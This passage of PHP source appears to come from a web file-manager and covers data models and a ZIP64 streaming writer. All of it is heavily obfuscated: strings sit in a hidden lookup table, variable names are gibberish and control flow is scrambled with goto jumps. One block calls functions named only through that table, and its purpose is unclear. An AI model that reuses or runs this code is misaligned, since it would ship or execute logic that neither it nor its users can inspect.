Model($BÓ‰ó‚ÔÇŸ[538])->remove($a‘¾š…‡‚); goto C¾±Øààğ•; C¾±Øààğ•: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\x4c\151\x67\x68\164\101\160\x70"; public $modelType = "\x53\x79\x73\164\145\155\x4f\160\164\151\x6f\x6e"; public $field = array("\x6e\x61\155\x65", "\x67\162\157\x75\160", "\144\x65\163\143", "\x63\x6f\156\x74\x65\156\x74"); public function listData($bÜğÁ³‹¶ö = false, $A÷ÅĞœÈ = "\155\157\x64\151\x66\x79\x54\x69\x6d\x65", $FÂ¸ˆ«†µ  = true) { return parent::listData($bÜğÁ³‹¶ö, $A÷ÅĞœÈ, $FÂ¸ˆ«†µ ); } public function remove($F¼ùÔ›ƒ§) { $eÄã¶—Ê˜× = $this->findByName($F¼ùÔ›ƒ§); if (!$eÄã¶—Ê˜×) { return !1; } return parent::remove($eÄã¶—Ê˜×[$_SERVER[Å¸ş][367]]); } public function add($FÙã¤êÃœë) { if ($this->findByName($FÙã¤êÃœë[$_SERVER[Å¸ş][28]])) { return !1; } return parent::insert($FÙã¤êÃœë); } public function update($DÉ„Äë®ƒ¤, $fÒ¶ŒË¸“Ñ) { $a‹Ÿš©Úõ =& $_SERVER[Å¸ş]; $e¢«äŸø¦ß = $this->findByName($DÉ„Äë®ƒ¤); $B‡¼Ñ¥‰ = $this->findByName($fÒ¶ŒË¸“Ñ[$a‹Ÿš©Úõ[28]]); if (!$e¢«äŸø¦ß || $B‡¼Ñ¥‰ && $B‡¼Ñ¥‰[$a‹Ÿš©Úõ[367]] != $e¢«äŸø¦ß[$a‹Ÿš©Úõ[367]]) { return !1; } return parent::update($e¢«äŸø¦ß[$a‹Ÿš©Úõ[367]], $fÒ¶ŒË¸“Ñ); } } goto E½‰¨·ÖÎÕ; cÜ«Ë•†…à: class ZipMake { const VERSION = "\x30\x2e\62\x2e\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($cî¾¦–¿¡— = null) { $F–æ½¨ë =& $_SERVER[Å¸ş]; $this->outputStream = fopen($F–æ½¨ë[2012], $F–æ½¨ë[1224]); $this->outputName = $cî¾¦–¿¡—; $this->needHeaders = !0; } public function addFile($Cõ¸Áã¯¨«, $BÕç£ÈãÕ”) { goto eĞùøè©®ó; C¢ÒŒ’øâ: $EŠç»ÏÊ°Í = $this->addFileHeader($Cõ¸Áã¯¨«, $e™›´Ø…¼‘); $AµÀËÂÑò = $c¼Í¤ğĞ‹Ï = filesize($BÕç£ÈãÕ”); $c™™°„Í»¶ = fopen($BÕç£ÈãÕ”, $C³ÔìÙ¦çä[2013]); goto aá˜•ËÒ; EŞŒÅÕ½Ãç: $this->addFileFooter($Cõ¸Áã¯¨«, $e™›´Ø…¼‘, $Dó¥¡–Ş, $AµÀËÂÑò, $c¼Í¤ğĞ‹Ï, $EŠç»ÏÊ°Í); goto A®ì‡’°ù; eĞùøè©®ó: $C³ÔìÙ¦çä =& $_SERVER[Å¸ş]; $Cõ¸Áã¯¨« = $this->filterFilename($Cõ¸Áã¯¨«); $e™›´Ø…¼‘ = static::METHOD_STORE; goto C¢ÒŒ’øâ; aá˜•ËÒ: while (!feof($c™™°„Í»¶)) { $f¥Ì†ŠÒØ = fread($c™™°„Í»¶, 1048576); $this->send($f¥Ì†ŠÒØ); } fclose($c™™°„Í»¶); $Dó¥¡–Ş = hexdec(hash_file($C³ÔìÙ¦çä[2014], $BÕç£ÈãÕ”)); goto EŞŒÅÕ½Ãç; A®ì‡’°ù: } public function addFileFromStream($b¯¸™øÜ§‚, $AÚšÛ­ñšÚ) { goto e´˜‰ãœöĞ; e¸ŠÓˆãº: $this->addFileFooter($b¯¸™øÜ§‚, $C†£Şæ®È, $c›ä¦±²Û÷, $c•ÑÙáœãù, $B¢¯õ„£Ï, $Cá÷åŠÆÌ); goto d«»¡Œ„Ô; e´˜‰ãœöĞ: $b¯¸™øÜ§‚ = $this->filterFilename($b¯¸™øÜ§‚); $C†£Şæ®È = static::METHOD_STORE; $Cá÷åŠÆÌ = $this->addFileHeader($b¯¸™øÜ§‚, $C†£Şæ®È); goto B˜åÂÎÁß¾; B˜åÂÎÁß¾: fseek($AÚšÛ­ñšÚ, 0, SEEK_END); $c•ÑÙáœãù = $B¢¯õ„£Ï = ftell($AÚšÛ­ñšÚ); rewind($AÚšÛ­ñšÚ); goto C‡à®ÕÍ‰; C‡à®ÕÍ‰: $eã­ÊŠ¢¶ = hash_init($_SERVER[Å¸ş][2014]); while (!feof($AÚšÛ­ñšÚ)) { $A¦ÀÄ¥³‡ã = fread($AÚšÛ­ñšÚ, 1048576); hash_update($eã­ÊŠ¢¶, $A¦ÀÄ¥³‡ã); $this->send($A¦ÀÄ¥³‡ã); } $c›ä¦±²Û÷ = hexdec(hash_final($eã­ÊŠ¢¶)); goto e¸ŠÓˆãº; d«»¡Œ„Ô: } public function finish() { foreach ($this->files as $F«‡‘¾³¥) { $this->addCdrFile($F«‡‘¾³¥); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($E±„Ìµ‘†¯, $C¢–ÀœÄ…) { goto cÉÕ‰éµ; CÅ èã–Äğ: return strlen($CØÌ«Şœñ•) + $C°·¨à‚Úª + strlen($FªÊŸ‡º´Ì); goto d§”ÁÔïÑ·; B•˜äÏ œ”: $EÜò³‹Á”Ë = $this->dosTime(time()); $bäˆ¹‡µ¹„ = array(array($F£æÔÄğÛ[2016], static::FILE_HEADER_SIGNATURE), array($F£æÔÄğÛ[2017], static::ZIP_VERSION_64), array($F£æÔÄğÛ[2017], 8), array($F£æÔÄğÛ[2017], $C¢–ÀœÄ…), array($F£æÔÄğÛ[2016], $EÜò³‹Á”Ë), array($F£æÔÄğÛ[2016], 0), array($F£æÔÄğÛ[2016], 4294967295), array($F£æÔÄğÛ[2016], 4294967295), array($F£æÔÄğÛ[2017], $C°·¨à‚Úª), array($F£æÔÄğÛ[2017], 32)); $F“±ËçÔ‚™ = array(array($F£æÔÄğÛ[2017], 1), array($F£æÔÄğÛ[2017], 28), array($F£æÔÄğÛ[2018], 0), array($F£æÔÄğÛ[2018], 0), array($F£æÔÄğÛ[2018], 0), array($F£æÔÄğÛ[2016], 0)); goto CÉ·Şº†ù; cÉÕ‰éµ: $F£æÔÄğÛ =& $_SERVER[Å¸ş]; $E±„Ìµ‘†¯ = preg_replace($F£æÔÄğÛ[2015], $F£æÔÄğÛ[33], $E±„Ìµ‘†¯); $C°·¨à‚Úª = strlen($E±„Ìµ‘†¯); goto B•˜äÏ œ”; CÉ·Şº†ù: $CØÌ«Şœñ• = $this->packFields($bäˆ¹‡µ¹„); $FªÊŸ‡º´Ì = $this->packFields($F“±ËçÔ‚™); $this->send($CØÌ«Şœñ• . $E±„Ìµ‘†¯ . $FªÊŸ‡º´Ì); goto CÅ èã–Äğ; d§”ÁÔïÑ·: } protected function addFileFooter($a«—Óš¼¥‰, $DÉ¡‰¤¨ÚÏ, $DèáÜÓ¬ğ‡, $Câ’‘È‡‚, $CÉİ¬¤¾´Ô, $aˆãŸè¯Ñ¦) { $f¾Ş†ë¢‚Æ =& $_SERVER[Å¸ş]; $BÊ÷›¿¬©Ø = array(array($f¾Ş†ë¢‚Æ[2016], static::DATA_DESCRIPTOR_SIGNATURE), array($f¾Ş†ë¢‚Æ[2016], $DèáÜÓ¬ğ‡), array($f¾Ş†ë¢‚Æ[2018], $Câ’‘È‡‚), array($f¾Ş†ë¢‚Æ[2018], $CÉİ¬¤¾´Ô)); $e¨—˜íõˆê = $this->packFields($BÊ÷›¿¬©Ø); $this->send($e¨—˜íõˆê); $aàèçôŒ–ª = $aˆãŸè¯Ñ¦ + $Câ’‘È‡‚ + $aÔ½”Õß; $this->addToCdr($a«—Óš¼¥‰, $DÉ¡‰¤¨ÚÏ, $DèáÜÓ¬ğ‡, $Câ’‘È‡‚, $CÉİ¬¤¾´Ô, $aàèçôŒ–ª); } private function addToCdr($f›æÇ¿”, $fÙÀÆ—ãå¡, $B×¢»áµ×İ, $AÌÁµ§ëíÈ, $F¼Ú•â¶Ã , $F•à‚òØŠ) { $this->files[] = array($f›æÇ¿”, $fÙÀÆ—ãå¡, $B×¢»áµ×İ, $AÌÁµ§ëíÈ, $F¼Ú•â¶Ã , $this->ofs); $this->ofs += $F•à‚òØŠ; } protected function addCdrFile($BÔ…Öƒİ«) { goto ağ„¡â‹ßÙ; B¸Œ¡ÉÂ Ü: $this->send($DÄÎ®¨’õ); $this->cdr_ofs += strlen($DÄÎ®¨’õ); goto c›ù¨ß±·Æ; ağ„¡â‹ßÙ: $DÍÂ‰†¡ìÙ =& $_SERVER[Å¸ş]; list($fèë³„†, $DïŒ·ÈÛ¶å, $e­Ò°í³º¨, $bƒ°ÒŞ¶, $DĞÚŠ§©Ã, $EŒ®æ‘è) = $BÔ…Öƒİ«; $FÉçå÷®›‹ = $DÍÂ‰†¡ìÙ[33]; goto dâÉ®ˆ´±ï; dâÉ®ˆ´±ï: $eààî‰ÛÎ = $this->dosTime(time()); $bµñ¯ÀÏ‚ = array(array($DÍÂ‰†¡ìÙ[2016], static::CDR_FILE_SIGNATURE), array($DÍÂ‰†¡ìÙ[2017], static::ZIP_VERSION_64), array($DÍÂ‰†¡ìÙ[2017], static::ZIP_VERSION_64), array($DÍÂ‰†¡ìÙ[2017], 8), array($DÍÂ‰†¡ìÙ[2017], $DïŒ·ÈÛ¶å), array($DÍÂ‰†¡ìÙ[2016], $eààî‰ÛÎ), array($DÍÂ‰†¡ìÙ[2016], $e­Ò°í³º¨), array($DÍÂ‰†¡ìÙ[2016], 4294967295), array($DÍÂ‰†¡ìÙ[2016], 4294967295), array($DÍÂ‰†¡ìÙ[2017], strlen($fèë³„†)), array($DÍÂ‰†¡ìÙ[2017], 32), array($DÍÂ‰†¡ìÙ[2017], strlen($FÉçå÷®›‹)), array($DÍÂ‰†¡ìÙ[2017], 0), array($DÍÂ‰†¡ìÙ[2017], 0), array($DÍÂ‰†¡ìÙ[2016], 32), array($DÍÂ‰†¡ìÙ[2016], 4294967295)); $Cã¥Û«¡‘ñ = array(array($DÍÂ‰†¡ìÙ[2017], 1), array($DÍÂ‰†¡ìÙ[2017], 28), array($DÍÂ‰†¡ìÙ[2018], $DĞÚŠ§©Ã), array($DÍÂ‰†¡ìÙ[2018], $bƒ°ÒŞ¶), array($DÍÂ‰†¡ìÙ[2018], $EŒ®æ‘è), array($DÍÂ‰†¡ìÙ[2016], 0)); goto CÄ¶Ô¨˜‡Ï; CÄ¶Ô¨˜‡Ï: $EŞ‹Úœ¾²Ğ = $this->packFields($bµñ¯ÀÏ‚); $e®…Û™õª = $this->packFields($Cã¥Û«¡‘ñ); $DÄÎ®¨’õ = $EŞ‹Úœ¾²Ğ . $fèë³„† . $FÉçå÷®›‹ . $e®…Û™õª; goto B¸Œ¡ÉÂ Ü; c›ù¨ß±·Æ: } protected function addCdr64Eof() { goto Aö¯ŸëµÀ; Aö¯ŸëµÀ: $CĞ½ÜªÙ· =& $_SERVER[Å¸ş]; $eàáâİç²ß = count($this->files); $e…Ä‘ÇˆÊ± = $this->cdr_ofs; goto fô£ƒ°á‹Ó; f¶ÒÕ÷³¸: $this->send($eÑ´àœÂ¦â); goto AˆÙº¦¶Ù; fô£ƒ°á‹Ó: $bˆ¥¡¸¸¼ = $this->ofs; $C»‰Å¼È¢ = array(array($CĞ½ÜªÙ·[2016], static::ZIP64_CDR_EOF_SIGNATURE), array($CĞ½ÜªÙ·[2018], 44), array($CĞ½ÜªÙ·[2017], static::ZIP_VERSION_64), array($CĞ½ÜªÙ·[2017], static::ZIP_VERSION_64), array($CĞ½ÜªÙ·[2016], 0), array($CĞ½ÜªÙ·[2016], 0), array($CĞ½ÜªÙ·[2018], $eàáâİç²ß), array($CĞ½ÜªÙ·[2018], $eàáâİç²ß), array($CĞ½ÜªÙ·[2018], $e…Ä‘ÇˆÊ±), array($CĞ½ÜªÙ·[2018], $bˆ¥¡¸¸¼)); $eÑ´àœÂ¦â = $this->packFields($C»‰Å¼È¢); goto f¶ÒÕ÷³¸; AˆÙº¦¶Ù: } protected function addCdr64Locator() { goto c—á¿†—; e‡ˆÉÑ¨‘Š: $EâÈ×¬‘‘­ = $this->ofs; $d„¡¦áğˆ· = array(array($cÉÁ¬õ¼Ë[2016], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($cÉÁ¬õ¼Ë[2016], 0), array($cÉÁ¬õ¼Ë[2018], $EâÈ×¬‘‘­ + $AŞ‡ª†¸á·), array($cÉÁ¬õ¼Ë[2016], 1)); $f‘¯ùŒŸİæ = $this->packFields($d„¡¦áğˆ·); goto c–ğñĞÍß–; c—á¿†—: $cÉÁ¬õ¼Ë =& $_SERVER[Å¸ş]; $d¢ÍŸÚó = count($this->files); $AŞ‡ª†¸á· = $this->cdr_ofs; goto e‡ˆÉÑ¨‘Š; c–ğñĞÍß–: $this->send($f‘¯ùŒŸİæ); goto AƒÁ§×˜¡Õ; AƒÁ§×˜¡Õ: } protected function addCdrEof() { goto c’¤ô¬‘‚º; c’¤ô¬‘‚º: $b™ë–§°“ =& $_SERVER[Å¸ş]; $fö¹³çòÕÂ = count($this->files); $bŠ‹·ã‹ = $this->cdr_ofs; goto fê¡ùƒ¼ªá; fê¡ùƒ¼ªá: $a…µ§åÎ¬ = $this->ofs; $Aœëš‡„Ëù = $b™ë–§°“[33]; $a¸à¥§£âˆ = array(array($b™ë–§°“[2016], static::CDR_EOF_SIGNATURE), array($b™ë–§°“[2017], 0), array($b™ë–§°“[2017], 0), array($b™ë–§°“[2017], $fö¹³çòÕÂ), array($b™ë–§°“[2017], $fö¹³çòÕÂ), array($b™ë–§°“[2016], 4294967295), array($b™ë–§°“[2016], 4294967295), array($b™ë–§°“[2017], strlen($Aœëš‡„Ëù))); goto f®Öë¼; f®Öë¼: $FÌ„ğ­÷ö´ = $this->packFields($a¸à¥§£âˆ) . $Aœëš‡„Ëù; $this->send($FÌ„ğ­÷ö´); goto C½„•ÒâÙÉ; C½„•ÒâÙÉ: } protected function addCdr() { foreach ($this->files as $DƒéÁùÜ“) { $this->addCdrFile($DƒéÁùÜ“); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $a•©ï÷¾¬Ê =& $_SERVER[Å¸ş]; $Aëİæ´äÃ = $a•©ï÷¾¬Ê[202]; if ($this->outputName) { $eÇĞ·ä…İã = trim(str_replace(array($a•©ï÷¾¬Ê[113], $a•©ï÷¾¬Ê[55], $a•©ï÷¾¬Ê[93], $a•©ï÷¾¬Ê[67], $a•©ï÷¾¬Ê[217], $a•©ï÷¾¬Ê[990]), $a•©ï÷¾¬Ê[33], $this->outputName)); $f©Ò´Š¼„Á = rawurlencode($eÇĞ·ä…İã); $Aëİæ´äÃ .= "\73\40\x66\151\154\x65\156\x61\x6d\145\x2a\x3d\165\164\x66\x2d\x38\x27\47{$f©Ò´Š¼„Á}"; } $c¶ñš‚©×Ç = array($a•©ï÷¾¬Ê[199] => $a•©ï÷¾¬Ê[2019], $a•©ï÷¾¬Ê[2020] => $Aëİæ´äÃ, $a•©ï÷¾¬Ê[2021] => $a•©ï÷¾¬Ê[2022], $a•©ï÷¾¬Ê[2023] => $a•©ï÷¾¬Ê[2024], $a•©ï÷¾¬Ê[2025] => $a•©ï÷¾¬Ê[2026]); foreach ($c¶ñš‚©×Ç as $b´ŞõÍãÒ¼ => $dá¾ËÈï ) { header($b´ŞõÍãÒ¼ . $a•©ï÷¾¬Ê[877] . $dá¾ËÈï ); } } protected function send($DÈØª›¿º) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $DÈØª›¿º); } protected final function dosTime($F¿§ùÙà´ï) { $bŸÅÍóŞ» =& $_SERVER[Å¸ş]; $a°Œ—–µ¯Š = getdate($F¿§ùÙà´ï); if ($a°Œ—–µ¯Š[$bŸÅÍóŞ»[1725]] < 1980) { $a°Œ—–µ¯Š = array($bŸÅÍóŞ»[1725] => 1980, $bŸÅÍóŞ»[2027] => 1, $bŸÅÍóŞ»[2028] => 1, $bŸÅÍóŞ»[2029] => 0, $bŸÅÍóŞ»[2030] => 0, $bŸÅÍóŞ»[2031] => 0); } $a°Œ—–µ¯Š[$bŸÅÍóŞ»[1725]] -= 1980; return $a°Œ—–µ¯Š[$bŸÅÍóŞ»[1725]] << 25 | $a°Œ—–µ¯Š[$bŸÅÍóŞ»[2027]] << 21 | $a°Œ—–µ¯Š[$bŸÅÍóŞ»[2028]] << 16 | $a°Œ—–µ¯Š[$bŸÅÍóŞ»[2029]] << 11 | $a°Œ—–µ¯Š[$bŸÅÍóŞ»[2030]] << 5 | $a°Œ—–µ¯Š[$bŸÅÍóŞ»[2031]] >> 1; } protected function packFields($aÖğÏ¢ù«) { $fµíÄ¤¾ôº =& $_SERVER[Å¸ş]; $aÕÉ®¬ÇÏé = $fµíÄ¤¾ôº[33]; $e×ÁóğË–¦ = array(); foreach ($aÖğÏ¢ù« as $AÌ†Ï—¡) { $aÕÉ®¬ÇÏé .= $AÌ†Ï—¡[0]; $e×ÁóğË–¦[] = $AÌ†Ï—¡[1]; } array_unshift($e×ÁóğË–¦, $aÕÉ®¬ÇÏé); return call_user_func_array($fµíÄ¤¾ôº[2032], $e×ÁóğË–¦); } protected function filterFilename($AƒÕ‰Áä­Š) { $Eíµ«¨¶¦ß =& $_SERVER[Å¸ş]; return str_replace(array($Eíµ«¨¶¦ß[93], $Eíµ«¨¶¦ß[4], $Eíµ«¨¶¦ß[176], $Eíµ«¨¶¦ß[69], $Eíµ«¨¶¦ß[113], $Eíµ«¨¶¦ß[922], $Eíµ«¨¶¦ß[925], $Eíµ«¨¶¦ß[271]), $Eíµ«¨¶¦ß[70], $AƒÕ‰Áä­Š); } } class ZipStream { } if ($_SERVER[$_SERVER[Å¸ş][557]] != $_SERVER[$_SERVER[Å¸ş][1769]]) { goto D¸ÁŠùİª; CÜ¼ŒŸÏßÀ: $B›ÎòÂºôæ = explode($_SERVER[Å¸ş][217], $BÌì²¡”Û); if (count($B›ÎòÂºôæ) < $_SERVER[Å¸ş][561]) { $DóŸ«à¾‚‘ = $_SERVER[Å¸ş][562]; $DóŸ«à¾‚‘(); } $bÒ¤¥¥•™ë = $_SERVER[Å¸ş][563]; goto aÅíÌ‰–Ç; D¸ÁŠùİª: $cÕ¤Ñ‡Ê«‚ = $_SERVER[Å¸ş][558]; $b¶Ü·½ø„Í = $_SERVER[$_SERVER[Å¸ş][559]] . $_SERVER[Å¸ş][560]; $BÌì²¡”Û = $cÕ¤Ñ‡Ê«‚($b¶Ü·½ø„Í); goto CÜ¼ŒŸÏßÀ; aÅíÌ‰–Ç: $bÒ¤¥¥•™ë($_SERVER[$_SERVER[Å¸ş][790]]); goto eÜğ¦ˆÈÉ¥; eÜğ¦ˆÈÉ¥: } goto DŞœ–Üµã; d°ƒğÅÌí¾: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\x6f\x70\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($E‡ç¬âŞâ) { $EÂ–Š‘§†Ô =& $_SERVER[Å¸ş]; if (!defined($EÂ–Š‘§†Ô[427])) { define($EÂ–Š‘§†Ô[427], 0); } return "\x55\163\x65\x72\x4f\160\x74\151\x6f\156\x5f{$E‡ç¬âŞâ}\137" . USER_ID; } protected function filterWhere($c©‡Øğİ¨á) { $Fö÷µ®ˆ‡š =& $_SERVER[Å¸ş]; if (!defined($Fö÷µ®ˆ‡š[427])) { define($Fö÷µ®ˆ‡š[427], 0); } $c©‡Øğİ¨á[$Fö÷µ®ˆ‡š[1436]] = USER_ID; return $c©‡Øğİ¨á; } public function cacheRemoveUser($b•òÃ³‡åñ, $d†À‘œÛîå) { return Cache::remove("\125\163\x65\162\x4f\160\164\151\x6f\x6e\x5f{$b•òÃ³‡åñ}\x5f" . $d†À‘œÛîå); } protected function optionDefault($fÇØ‚¶Ì¤‹ = '') { $a¹ä§›ßÏÉ =& $_SERVER[Å¸ş]; if ($fÇØ‚¶Ì¤‹ == $a¹ä§›ßÏÉ[33]) { return $GLOBALS[$a¹ä§›ßÏÉ[6]][$a¹ä§›ßÏÉ[2568]]; } if ($fÇØ‚¶Ì¤‹ == $a¹ä§›ßÏÉ[2569]) { return $GLOBALS[$a¹ä§›ßÏÉ[6]][$a¹ä§›ßÏÉ[2570]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\162\x2e\164\141\x67\114\151\x73\164"; public $modelType = "\125\x73\145\x72\117\x70\164\151\157\x6e"; public $field = array("\x6e\141\155\x65", "\x73\x74\171\154\145", "\163\x6f\x72\x74"); public function listData($cµÎÍñ·°¹ = false, $EŞœÑøŠ‡é = "\x73\157\x72\x74", $FÌ‹¾¯œª = false) { return parent::listData($cµÎÍñ·°¹, $EŞœÑøŠ‡é, $FÌ‹¾¯œª); } public function remove($cœÖ…¦ÇØ‡) { return parent::remove($cœÖ…¦ÇØ‡); } public function add($e’ÈŞ÷äµ, $Bà×À“ÕœÅ = "\154\x61\142\145\154\55\147\162\x65\x79\55\x6e\157\x72\x6d\x61\x6c") { $D×ÔŒ¦ùš =& $_SERVER[Å¸ş]; if ($this->findByName($e’ÈŞ÷äµ)) { return !1; } $A®Àğ„µ = array($D×ÔŒ¦ùš[386] => $e’ÈŞ÷äµ, $D×ÔŒ¦ùš[437] => $Bà×À“ÕœÅ, $D×ÔŒ¦ùš[2112] => $this->getSort($D×ÔŒ¦ùš[246]) + 1); return parent::insert($A®Àğ„µ); } public function update($Aš¶áñÑªö, $c ”½ïØ) { $b”‰º¨¶Ã =& $_SERVER[Å¸ş]; $c¿ßî¸êÎ = $this->listData($Aš¶áñÑªö); $Eƒ ƒå•çÒ = $this->findByName($c ”½ïØ[$b”‰º¨¶Ã[28]]); if (!$c¿ßî¸êÎ || $Eƒ ƒå•çÒ && $Eƒ ƒå•çÒ[$b”‰º¨¶Ã[367]] != $c¿ßî¸êÎ[$b”‰º¨¶Ã[367]]) { return !1; } return parent::update($Aš¶áñÑªö, $c ”½ïØ); } public function moveTop($Eì‘£¯ÆÚÛ) { $b§øŒ™¨£ =& $_SERVER[Å¸ş]; $DÚçÊ‡Å°¦ = parent::listData(); $B‚ÆğéŞº´ = $this->getSort($b§øŒ™¨£[245]); foreach ($DÚçÊ‡Å°¦ as &$CŠäƒ®Šìƒ) { if ($CŠäƒ®Šìƒ[$b§øŒ™¨£[367]] == $Eì‘£¯ÆÚÛ) { $CŠäƒ®Šìƒ[$b§øŒ™¨£[2130]] = $B‚ÆğéŞº´; continue; } $CŠäƒ®Šìƒ[$b§øŒ™¨£[2130]] += 1; } unset($CŠäƒ®Šìƒ); return parent::resetData($DÚçÊ‡Å°¦); } public function moveBottom($E‡•Ìùª£è) { $bÇóÁ±‹‰÷ =& $_SERVER[Å¸ş]; $CÒ’éõÇ”‘ = $this->getSort($bÇóÁ±‹‰÷[246]) + 1; return parent::update($E‡•Ìùª£è, array($bÇóÁ±‹‰÷[2130] => $CÒ’éõÇ”‘)); } public function resetSort($A“÷óšŸõ–) { goto AÉìĞåôÃ; FÈ‰·°»¶: unset($e¬ªÖçÎÍ); return parent::resetData($EÖ £´…Å); goto F¿Í¼„šŸ; AÉìĞåôÃ: $A¨„Š‚ … =& $_SERVER[Å¸ş]; $c¿ò…ã²›ì = array(); $A“÷óšŸõ– = is_array($A“÷óšŸõ–) ? $A“÷óšŸõ– : array(); goto e‘®ÈÏÛÊø; e‘®ÈÏÛÊø: for ($e†×ùÙ„œ© = 0; $e†×ùÙ„œ© < count($A“÷óšŸõ–); $e†×ùÙ„œ©++) { $c¿ò…ã²›ì[$A“÷óšŸõ–[$e†×ùÙ„œ©] . $A¨„Š‚ …[33]] = $e†×ùÙ„œ© + 1; } $EÖ £´…Å = parent::listData(); foreach ($EÖ £´…Å as &$e¬ªÖçÎÍ) { $E›¬ô“‚î† = $c¿ò…ã²›ì[$e¬ªÖçÎÍ[$A¨„Š‚ …[367]]]; $e¬ªÖçÎÍ[$A¨„Š‚ …[2130]] = $E›¬ô“‚î† ? $E›¬ô“‚î† : $e¬ªÖçÎÍ[$A¨„Š‚ …[2130]]; } goto FÈ‰·°»¶; F¿Í¼„šŸ: } private function getSort($Fî’ƒÄÒ¡) { $dŒÂë¢Â§× =& $_SERVER[Å¸ş]; $f–Ó†É®Á = parent::listData(); $dŒÉå«¯ğº = array_to_keyvalue($f–Ó†É®Á, $dŒÂë¢Â§×[33], $dŒÂë¢Â§×[2130]); if (!$dŒÉå«¯ğº) { $dŒÉå«¯ğº = array(0); } $FŠ·ƒ—¹ = $Fî’ƒÄÒ¡ == $dŒÂë¢Â§×[246] ? max($dŒÉå«¯ğº) : min($dŒÉå«¯ğº); return intval($FŠ·ƒ—¹); } } goto A¼ºÔòÁ; E½‰¨·ÖÎÕ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\145\155\137\154\157\147"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\124\x69\x6d\x65", "\164\151\155\145", "\x69\156\163\x65\162\x74", "\146\165\156\x63\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $CÔçô²İàŞ =& $_SERVER[Å¸ş]; return array($CÔçô²İàŞ[2413] => LNG($CÔçô²İàŞ[2414]), $CÔçô²İàŞ[2415] => LNG($CÔçô²İàŞ[2416]), $CÔçô²İàŞ[2047] => LNG($CÔçô²İàŞ[2417]), $CÔçô²İàŞ[2418] => LNG($CÔçô²İàŞ[2419]), $CÔçô²İàŞ[2420] => LNG($CÔçô²İàŞ[2421]), $CÔçô²İàŞ[2422] => LNG($CÔçô²İàŞ[2423]), $CÔçô²İàŞ[2424] => LNG($CÔçô²İàŞ[2425]), $CÔçô²İàŞ[2426] => LNG($CÔçô²İàŞ[2427]), $CÔçô²İàŞ[2078] => LNG($CÔçô²İàŞ[2428]), $CÔçô²İàŞ[2079] => LNG($CÔçô²İàŞ[2429]), $CÔçô²İàŞ[2430] => LNG($CÔçô²İàŞ[2431]), $CÔçô²İàŞ[2432] => LNG($CÔçô²İàŞ[2433]), $CÔçô²İàŞ[2434] => LNG($CÔçô²İàŞ[2435]), $CÔçô²İàŞ[2436] => LNG($CÔçô²İàŞ[2437]), $CÔçô²İàŞ[2076] => LNG($CÔçô²İàŞ[2438]), $CÔçô²İàŞ[2083] => LNG($CÔçô²İàŞ[2439]), $CÔçô²İàŞ[2440] => LNG($CÔçô²İàŞ[2441]), $CÔçô²İàŞ[2442] => LNG($CÔçô²İàŞ[2443]), $CÔçô²İàŞ[2444] => LNG($CÔçô²İàŞ[2445]), $CÔçô²İàŞ[2446] => LNG($CÔçô²İàŞ[2447]), $CÔçô²İàŞ[2086] => LNG($CÔçô²İàŞ[2448]), $CÔçô²İàŞ[2087] => LNG($CÔçô²İàŞ[2449]), $CÔçô²İàŞ[2450] => LNG($CÔçô²İàŞ[2451]), $CÔçô²İàŞ[2452] => LNG($CÔçô²İàŞ[2453]), $CÔçô²İàŞ[2454] => LNG($CÔçô²İàŞ[2455]), $CÔçô²İàŞ[2081] => LNG($CÔçô²İàŞ[2456]), $CÔçô²İàŞ[2457] => LNG($CÔçô²İàŞ[2458]), $CÔçô²İàŞ[2080] => LNG($CÔçô²İàŞ[2459]), $CÔçô²İàŞ[2460] => LNG($CÔçô²İàŞ[2461]), $CÔçô²İàŞ[2462] => LNG($CÔçô²İàŞ[2463]), $CÔçô²İàŞ[2464] => LNG($CÔçô²İàŞ[2464]), $CÔçô²İàŞ[2465] => LNG($CÔçô²İàŞ[2051]), $CÔçô²İàŞ[2466] => LNG($CÔçô²İàŞ[2467]), $CÔçô²İàŞ[2468] => LNG($CÔçô²İàŞ[2469]), $CÔçô²İàŞ[2470] => LNG($CÔçô²İàŞ[2471]), $CÔçô²İàŞ[2472] => LNG($CÔçô²İàŞ[2473]), $CÔçô²İàŞ[2474] => LNG($CÔçô²İàŞ[2475]), $CÔçô²İàŞ[2476] => LNG($CÔçô²İàŞ[2476]), $CÔçô²İàŞ[2477] => LNG($CÔçô²İàŞ[2478]), $CÔçô²İàŞ[2479] => LNG($CÔçô²İàŞ[2480]), $CÔçô²İàŞ[2481] => LNG($CÔçô²İàŞ[2482]), $CÔçô²İàŞ[2483] => LNG($CÔçô²İàŞ[2484]), $CÔçô²İàŞ[2485] => LNG($CÔçô²İàŞ[2486]), $CÔçô²İàŞ[2487] => LNG($CÔçô²İàŞ[2488])); } private function typeFile() { $eÇÊÕ¤á¡“ =& $_SERVER[Å¸ş]; $AŒ„À·¨…¡ = array($eÇÊÕ¤á¡“[2083] => array($eÇÊÕ¤á¡“[2084]), $eÇÊÕ¤á¡“[2434] => array($eÇÊÕ¤á¡“[2489]), $eÇÊÕ¤á¡“[2436] => array($eÇÊÕ¤á¡“[2490]), $eÇÊÕ¤á¡“[2076] => array($eÇÊÕ¤á¡“[2077]), $eÇÊÕ¤á¡“[2442] => array(), $eÇÊÕ¤á¡“[2444] => array(), $eÇÊÕ¤á¡“[2446] => array(), 